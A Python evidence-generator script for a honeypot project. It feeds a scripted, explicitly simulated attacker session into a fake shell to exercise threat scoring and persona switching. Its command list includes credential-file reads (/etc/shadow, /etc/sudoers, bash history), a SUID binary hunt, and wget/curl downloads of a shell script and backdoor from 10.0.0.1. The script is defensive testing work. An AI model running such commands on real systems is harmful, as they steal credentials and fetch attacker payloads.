"""Simulated attacker session walkthrough — evidence generator.

IMPORTANT LABELING NOTICE
==========================
This is a **simulated/scripted session**, run by the development team to
demonstrate mechanism behavior — **not a real attacker session**.  The
command sequence is chosen to exercise the threat scorer, pattern
detector, and persona switcher through a realistic escalation path.
No actual attackers were involved; no network traffic was generated.

Outputs:
    evidence/03_simulated_session/session_trace.json     (machine-readable)
    evidence/03_simulated_session/session_transcript.txt  (human-readable)
"""
from __future__ import annotations

import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import List

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from honeypot.cowrie_hook import create_dispatcher
from event_logging.session_logger import SessionLogger

DISCLAIMER = (
    "SIMULATED/SCRIPTED SESSION, run by the development team to demonstrate "
    "mechanism behavior -- not a real attacker session."
)

# ---------------------------------------------------------------------------
# Command sequence — escalation from benign recon to exfiltration
# ---------------------------------------------------------------------------
COMMANDS: List[tuple[str, str]] = [
    # --- Phase 1: Basic Reconnaissance ---
    ("whoami",                            "Attacker checks current identity"),
    ("id",                                "Detailed user / group info"),
    ("pwd",                               "Current working directory"),
    ("ls",                                "List home directory contents"),
    ("uname -a",                          "Full system identification"),
    ("hostname",                          "Hostname check"),

    # --- Phase 2: System Exploration ---
    ("cat /etc/passwd",                   "Enumerate all system users"),
    ("ps aux",                            "Full process listing"),
    ("netstat -tlnp",                     "Check listening ports"),
    ("env",                               "Dump environment variables"),
    ("cat /etc/hostname",                 "Verify hostname file"),
    ("ls -la /home",                      "Look for other user accounts"),
    ("cat ~/.bash_history",               "Read prior command history"),

    # --- Phase 3: Privilege Escalation Attempts ---
    ("sudo -l",                           "Check sudo privileges"),
    ("cat /etc/shadow",                   "Attempt to read password hashes"),
    ("cat /etc/sudoers",                  "Check sudoers configuration"),
    ("find / -perm -4000 -type f 2>/dev/null",  "Hunt for SUID binaries"),

    # --- Phase 4: Exfiltration / Weaponisation ---
    ("wget http://10.0.0.1/shell.sh",    "Download attacker toolkit"),
    ("curl http://10.0.0.1/backdoor.py -o /tmp/bd.py",
                                          "Download backdoor script"),
    ("ls /tmp",                           "Verify downloaded files landed"),
    ("cat /tmp/bd.py",                    "Inspect downloaded payload"),

    # --- Post-switch verification ---
    ("whoami",                            "Re-check identity after persona shift"),
    ("ps aux",                            "Process list in new persona context"),
    ("ls",                                "Home directory in new persona context"),
]


def threat_level_label(score: int) -> str:
    if score <= 20:
        return "low"
    elif score <= 50:
        return "medium"
    elif score <= 80:
        return "high"
    return "critical"


def main() -> None:
    out_dir = Path(__file__).resolve().parent
    ts = datetime.now(tz=timezone.utc)

    # -- Create dispatcher --------------------------------------------------
    log_dir = PROJECT_ROOT / "event_logging" / "logs"
    logger = SessionLogger(
        log_dir=str(log_dir),
        logger_name=f"evidence_session_{id(ts)}",
    )
    dispatcher = create_dispatcher(
        session_id="evidence-sim-001",
        attacker_ip="185.220.101.42",
        attacker_port=48372,
        persona_name="generic_linux",
        session_logger=logger,
    )

    # -- Run commands and collect telemetry ---------------------------------
    trace_entries = []
    prev_persona = "generic_linux"

    for cmd, intent in COMMANDS:
        start = time.perf_counter()
        response, source = dispatcher.dispatch(cmd)
        latency_ms = (time.perf_counter() - start) * 1000

        session = dispatcher.session
        history = session.command_history
        last = history[-1] if history else {}
        score = session.threat_score
        category = last.get("category", "benign")
        delta = last.get("score_delta", 0)
        level = threat_level_label(score)
        persona = dispatcher.persona_name

        persona_switched = persona != prev_persona
        switch_event = None
        if persona_switched:
            switch_event = {
                "from": prev_persona,
                "to": persona,
                "trigger_score": score,
            }
            prev_persona = persona

        entry = {
            "step": len(trace_entries) + 1,
            "command": cmd,
            "intent": intent,
            "category": category,
            "score_delta": delta,
            "cumulative_score": score,
            "threat_level": level,
            "persona": persona,
            "response_source": source,
            "latency_ms": round(latency_ms, 1),
            "response_preview": response.strip()[:200],
            "persona_switch": switch_event,
        }
        trace_entries.append(entry)

    dispatcher.close()

    # -- Build JSON trace ---------------------------------------------------
    trace_data = {
        "_disclaimer": DISCLAIMER,
        "generated_at": ts.isoformat(),
        "session_id": "evidence-sim-001",
        "simulated_attacker_ip": "185.220.101.42",
        "initial_persona": "generic_linux",
        "total_commands": len(trace_entries),
        "final_score": trace_entries[-1]["cumulative_score"],
        "final_threat_level": trace_entries[-1]["threat_level"],
        "final_persona": trace_entries[-1]["persona"],
        "persona_switches": [
            e["persona_switch"] for e in trace_entries if e["persona_switch"]
        ],
        "commands": trace_entries,
    }

    json_path = out_dir / "session_trace.json"
    json_path.write_text(json.dumps(trace_data, indent=2), encoding="utf-8")

    # -- Build human-readable transcript ------------------------------------
    lines = []
    lines.append("=" * 78)
    lines.append("  SIMULATED ATTACKER SESSION TRANSCRIPT")
    lines.append("")
    lines.append(f"  NOTICE: {DISCLAIMER}")
    lines.append("")
    lines.append(f"  Generated:  {ts.strftime('%Y-%m-%d %H:%M:%S UTC')}")
    lines.append(f"  Session ID: evidence-sim-001")
    lines.append(f"  Simulated attacker IP: 185.220.101.42")
    lines.append(f"  Initial persona: generic_linux")
    lines.append("=" * 78)

    current_phase = None
    phase_map = {
        1: "Phase 1: Basic Reconnaissance",
        7: "Phase 2: System Exploration",
        14: "Phase 3: Privilege Escalation Attempts",
        18: "Phase 4: Exfiltration / Weaponisation",
        22: "Post-Switch Verification",
    }

    for entry in trace_entries:
        step = entry["step"]
        if step in phase_map:
            current_phase = phase_map[step]
            lines.append("")
            lines.append(f"  --- {current_phase} {'─' * (60 - len(current_phase))}")
            lines.append("")

        # Command header
        delta_str = f"+{entry['score_delta']}" if entry['score_delta'] > 0 else "0"
        lines.append(f"  [{step:2d}] $ {entry['command']}")
        lines.append(f"       Intent:   {entry['intent']}")
        lines.append(f"       Category: {entry['category']:<24s}  "
                     f"Score: {delta_str:>3s} -> {entry['cumulative_score']:3d}/100  "
                     f"Level: {entry['threat_level']}")
        lines.append(f"       Source:   {entry['response_source']:<10s}  "
                     f"Latency: {entry['latency_ms']:6.1f} ms  "
                     f"Persona: {entry['persona']}")

        # Response preview (indent, truncate)
        resp = entry["response_preview"]
        resp_lines = resp.splitlines()
        max_show = 5
        for rline in resp_lines[:max_show]:
            lines.append(f"       | {rline[:72]}")
        if len(resp_lines) > max_show:
            lines.append(f"       | ... ({len(resp_lines) - max_show} more lines)")

        # Persona switch callout
        if entry["persona_switch"]:
            sw = entry["persona_switch"]
            lines.append("")
            lines.append(f"       *** PERSONA SWITCH: {sw['from']} --> {sw['to']} "
                         f"(triggered at score {sw['trigger_score']}) ***")

        lines.append("")

    # Summary
    final = trace_entries[-1]
    switches = [e["persona_switch"] for e in trace_entries if e["persona_switch"]]
    fast_count = sum(1 for e in trace_entries if e["response_source"] == "fast_path")
    llm_count = sum(1 for e in trace_entries if e["response_source"] == "llm")
    fallback_count = sum(1 for e in trace_entries if e["response_source"] == "fallback")
    avg_latency = sum(e["latency_ms"] for e in trace_entries) / len(trace_entries)

    lines.append("=" * 78)
    lines.append("  SESSION SUMMARY")
    lines.append("=" * 78)
    lines.append(f"  Total commands:       {len(trace_entries)}")
    lines.append(f"  Final score:          {final['cumulative_score']}/100")
    lines.append(f"  Final threat level:   {final['threat_level']}")
    lines.append(f"  Final persona:        {final['persona']}")
    lines.append(f"  Persona switches:     {len(switches)}")
    for sw in switches:
        lines.append(f"    - {sw['from']} -> {sw['to']} at score {sw['trigger_score']}")
    lines.append(f"  Response sources:     fast_path={fast_count}  "
                 f"llm={llm_count}  fallback={fallback_count}")
    lines.append(f"  Average latency:      {avg_latency:.1f} ms")
    lines.append("")
    lines.append(f"  Score progression by phase:")

    phase_boundaries = sorted(phase_map.keys())
    for i, start_step in enumerate(phase_boundaries):
        phase_name = phase_map[start_step]
        end_step = (phase_boundaries[i + 1] - 1) if i + 1 < len(phase_boundaries) else len(trace_entries)
        phase_entries = [e for e in trace_entries if start_step <= e["step"] <= end_step]
        if phase_entries:
            start_score = phase_entries[0]["cumulative_score"] - phase_entries[0]["score_delta"]
            end_score = phase_entries[-1]["cumulative_score"]
            lines.append(f"    {phase_name:<45s}  {start_score:3d} -> {end_score:3d}")

    lines.append("")
    lines.append(f"  NOTICE: {DISCLAIMER}")
    lines.append("=" * 78)

    txt_path = out_dir / "session_transcript.txt"
    txt_path.write_text("\n".join(lines), encoding="utf-8")

    # -- Console output -----------------------------------------------------
    print("\n".join(lines))
    print(f"\n  Saved: {json_path}")
    print(f"  Saved: {txt_path}")


if __name__ == "__main__":
    main()
